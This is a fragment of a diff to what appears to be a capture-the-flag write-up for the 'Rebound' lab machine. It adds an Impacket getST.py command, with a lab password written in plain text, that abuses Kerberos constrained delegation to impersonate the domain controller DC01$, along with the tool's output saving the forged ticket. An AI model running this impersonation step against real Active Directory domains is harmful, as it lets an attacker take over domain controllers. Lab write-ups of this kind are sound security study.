@@ -467,5 +467,14 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 This set the delegation
 
 ```python
+faketime -f +7h getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$                                                                                       
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating DC01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
 ```
+
